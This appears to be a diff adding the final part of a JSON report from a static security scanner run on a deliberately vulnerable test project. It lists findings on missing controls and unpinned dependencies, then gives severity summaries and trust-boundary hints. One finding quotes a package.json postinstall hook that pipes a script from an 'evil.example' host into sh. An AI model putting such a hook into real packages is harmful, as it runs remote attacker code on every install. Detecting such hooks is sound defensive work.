+        "CWE-770"
+      ],
+      "description": "",
+      "evidence": "Matched 2 required signal(s); none of 1 expected control pattern(s) present.",
+      "fingerprint": "363d7550223c3224eb19",
+      "id": "AUTO-0053",
+      "impact": "",
+      "location": {
+        "end_line": 2,
+        "path": "k8s/deployment.yaml",
+        "snippet": "kind: Deployment",
+        "start_line": 2
+      },
+      "owasp": [
+        "A05:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Set CPU/memory requests and limits to contain resource exhaustion.",
+      "rule_id": "IAC-K8S-NO-RESOURCE-LIMITS",
+      "severity": "low",
+      "sources": [
+        "builtin:iac"
+      ],
+      "status": "missing-control",
+      "title": "Workload without resource limits",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "supply-chain",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-1104",
+        "CWE-829"
+      ],
+      "description": "",
+      "evidence": "Manifest package.json found without a npm lockfile.",
+      "fingerprint": "26045036331847942e7c",
+      "id": "AUTO-0054",
+      "impact": "",
+      "location": {
+        "end_line": 0,
+        "path": "package.json",
+        "snippet": "",
+        "start_line": 0
+      },
+      "owasp": [
+        "A06:2021",
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Commit a lockfile so builds are reproducible and dependency integrity hashes are enforced.",
+      "rule_id": "SC-NO-LOCKFILE",
+      "severity": "low",
+      "sources": [
+        "builtin:supply-chain-structural"
+      ],
+      "status": "missing-control",
+      "title": "No lockfile for npm dependencies",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "security-headers",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-693"
+      ],
+      "description": "",
+      "evidence": "Matched 1 required signal(s); none of 1 expected control pattern(s) present.",
+      "fingerprint": "1215045d3d2ef1fac867",
+      "id": "AUTO-0055",
+      "impact": "",
+      "location": {
+        "end_line": 9,
+        "path": "package.json",
+        "snippet": "\"express\": \"4.17.1\",",
+        "start_line": 9
+      },
+      "owasp": [
+        "A05:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Add helmet (or equivalent explicit headers: CSP, HSTS, X-Content-Type-Options, frame-ancestors).",
+      "rule_id": "CFG-EXPRESS-NO-HELMET",
+      "severity": "low",
+      "sources": [
+        "builtin:config"
+      ],
+      "status": "missing-control",
+      "title": "Express app without security headers middleware",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "rate-limiting",
+      "confidence": "low",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-307",
+        "CWE-770"
+      ],
+      "description": "",
+      "evidence": "Matched 1 required signal(s); none of 1 expected control pattern(s) present.",
+      "fingerprint": "8db685547206e3ee0ac3",
+      "id": "AUTO-0056",
+      "impact": "",
+      "location": {
+        "end_line": 9,
+        "path": "package.json",
+        "snippet": "\"express\": \"4.17.1\",",
+        "start_line": 9
+      },
+      "owasp": [
+        "A07:2021",
+        "API4:2023"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Rate-limit authentication, password reset, OTP and expensive endpoints (express-rate-limit, gateway/WAF limits).",
+      "rule_id": "CFG-NO-RATE-LIMIT-DEP",
+      "severity": "low",
+      "sources": [
+        "builtin:config"
+      ],
+      "status": "missing-control",
+      "title": "No rate limiting library detected (Node)",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "supply-chain",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-1104"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for SC-WILDCARD-VERSION.",
+      "fingerprint": "e565e4803d6e2c879bdb",
+      "id": "AUTO-0057",
+      "impact": "",
+      "location": {
+        "end_line": 10,
+        "path": "package.json",
+        "snippet": "\"jsonwebtoken\": \"*\",",
+        "start_line": 10
+      },
+      "owasp": [
+        "A06:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Specify a version range and commit a lockfile; use exact versions for critical packages.",
+      "rule_id": "SC-WILDCARD-VERSION",
+      "severity": "low",
+      "sources": [
+        "builtin:supply-chain"
+      ],
+      "status": "unverified",
+      "title": "Dependency version wildcard or 'latest'",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "supply-chain",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-1104"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for SC-UNPINNED-PY-REQ.",
+      "fingerprint": "e0b12389655a19638aad",
+      "id": "AUTO-0058",
+      "impact": "",
+      "location": {
+        "end_line": 1,
+        "path": "requirements.txt",
+        "snippet": "flask",
+        "start_line": 1
+      },
+      "owasp": [
+        "A06:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Pin exact versions (==) and ideally hashes; generate with pip-compile/uv.",
+      "rule_id": "SC-UNPINNED-PY-REQ",
+      "severity": "low",
+      "sources": [
+        "builtin:supply-chain"
+      ],
+      "status": "unverified",
+      "title": "Unpinned Python requirement",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "supply-chain",
+      "confidence": "medium",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-1104"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for SC-UNPINNED-PY-REQ.",
+      "fingerprint": "61d4616c0715f897b284",
+      "id": "AUTO-0059",
+      "impact": "",
+      "location": {
+        "end_line": 2,
+        "path": "requirements.txt",
+        "snippet": "requests>=2.0",
+        "start_line": 2
+      },
+      "owasp": [
+        "A06:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Pin exact versions (==) and ideally hashes; generate with pip-compile/uv.",
+      "rule_id": "SC-UNPINNED-PY-REQ",
+      "severity": "low",
+      "sources": [
+        "builtin:supply-chain"
+      ],
+      "status": "unverified",
+      "title": "Unpinned Python requirement",
+      "triage_reason": "",
+      "validation_steps": []
+    },
+    {
+      "category": "supply-chain",
+      "confidence": "high",
+      "cvss_score": null,
+      "cvss_vector": "",
+      "cwe": [
+        "CWE-829"
+      ],
+      "description": "",
+      "evidence": "Line matches pattern for SC-INSTALL-SCRIPT.",
+      "fingerprint": "2804de5ba871b1e24fc0",
+      "id": "AUTO-0060",
+      "impact": "",
+      "location": {
+        "end_line": 5,
+        "path": "package.json",
+        "snippet": "\"postinstall\": \"curl -s https://evil.example/install.sh | sh\",",
+        "start_line": 5
+      },
+      "owasp": [
+        "A08:2021"
+      ],
+      "patch": "",
+      "references": [],
+      "regression_test": "",
+      "remediation": "Confirm the script is necessary and reviewed; consumers can install with --ignore-scripts.",
+      "rule_id": "SC-INSTALL-SCRIPT",
+      "severity": "info",
+      "sources": [
+        "builtin:supply-chain"
+      ],
+      "status": "accepted-risk",
+      "title": "Package defines an install-time lifecycle script",
+      "triage_reason": "Informational duplicate of SC-INSTALL-SCRIPT-SUSPICIOUS for the same line; tracked there. (Example of a recorded decision.)",
+      "validation_steps": []
+    }
+  ],
+  "inventory_summary": {
+    "auth": 3,
+    "ci-pipeline": 1,
+    "crypto": 1,
+    "db-query": 3,
+    "deserialization": 2,
+    "dockerfile": 1,
+    "env-file": 1,
+    "file-access": 2,
+    "http-route": 14,
+    "outbound-http": 3,
+    "redirect": 1,
+    "subprocess": 3,
+    "template-render": 3,
+    "terraform": 1
+  },
+  "limitations": [
+    "No running instance was available; all results are from static analysis (no runtime validation performed).",
+    "External scanners were not installed in the example run; dependency CVEs were not checked."
+  ],
+  "manual_review_included": true,
+  "posture": {
+    "level": "critical",
+    "open_by_severity": {
+      "critical": 2,
+      "high": 28,
+      "info": 0,
+      "low": 10,
+      "medium": 20
+    },
+    "statement": "Critical risk: at least one confirmed critical issue or critical attack path."
+  },
+  "posture_statement": "Critical. Multiple independent pre-authentication code-execution paths were confirmed by static tracing, and no authentication layer exists on any HTTP route. Runtime testing was not performed.",
+  "run": {
+    "config": null,
+    "fail_on": "high",
+    "files_scanned": 11,
+    "finished": null,
+    "git_commit": "",
+    "mode": "comprehensive",
+    "offline": true,
+    "started": null,
+    "target": "vulnerable-fixture"
+  },
+  "schema_version": "1",
+  "stack": {
+    "ci": [
+      "github-actions"
+    ],
+    "cloud": [
+      "aws"
+    ],
+    "containers": [
+      "docker"
+    ],
+    "datastores": [],
+    "file_count": 11,
+    "frameworks": [
+      "express",
+      "flask"
+    ],
+    "iac": [
+      "kubernetes",
+      "terraform"
+    ],
+    "languages": {
+      "hcl": 1,
+      "javascript": 2,
+      "python": 2
+    },
+    "lockfiles": {
+      "npm": [],
+      "pip": [
+        "requirements.txt"
+      ]
+    },
+    "manifests": [
+      "package.json",
+      "requirements.txt"
+    ],
+    "missing_lockfiles": [
+      "npm"
+    ],
+    "mobile": [],
+    "package_managers": [
+      "npm",
+      "pip"
+    ],
+    "primary_languages": [
+      "javascript",
+      "python",
+      "hcl"
+    ],
+    "unsupported_languages": []
+  },
+  "summary": {
+    "by_category": {
+      "authentication": 2,
+      "authorization": 2,
+      "cicd": 4,
+      "cloud": 6,
+      "container": 4,
+      "cors": 1,
+      "crypto": 2,
+      "deserialization": 2,
+      "injection": 6,
+      "kubernetes": 4,
+      "malware-indicator": 1,
+      "misconfiguration": 1,
+      "open-redirect": 1,
+      "path-traversal": 2,
+      "rate-limiting": 1,
+      "secrets": 7,
+      "security-headers": 1,
+      "ssrf": 1,
+      "supply-chain": 10,
+      "xss": 2
+    },
+    "by_severity": {
+      "critical": 2,
+      "high": 28,
+      "info": 0,
+      "low": 10,
+      "medium": 20
+    },
+    "by_status": {
+      "accepted-risk": 1,
+      "confirmed": 3,
+      "missing-control": 8,
+      "suspected": 4,
+      "unverified": 45
+    },
+    "open_total": 60
+  },
+  "threat_model": "",
+  "tool": {
+    "name": "appsec-assurance",
+    "version": "1.0.0"
+  },
+  "triage_warnings": [],
+  "trust_boundary_hints": [
+    "Client -> server API boundary: every route/resolver needs authn + object/function-level authz review.",
+    "Application -> datastore boundary: verify parameterization and least-privilege DB credentials.",
+    "Server -> external network boundary: check SSRF controls, TLS verification, timeouts, and unsafe consumption of third-party responses.",
+    "Application -> OS boundary: verify no untrusted input reaches shell/exec arguments.",
+    "Application -> filesystem boundary: path traversal, upload validation, storage outside webroot.",
+    "Untrusted data -> object graph boundary: deserialization of attacker-controlled bytes.",
+    "Contributor -> CI -> cloud/registry boundary: workflow triggers, token permissions, secret exposure."
+  ]
+}
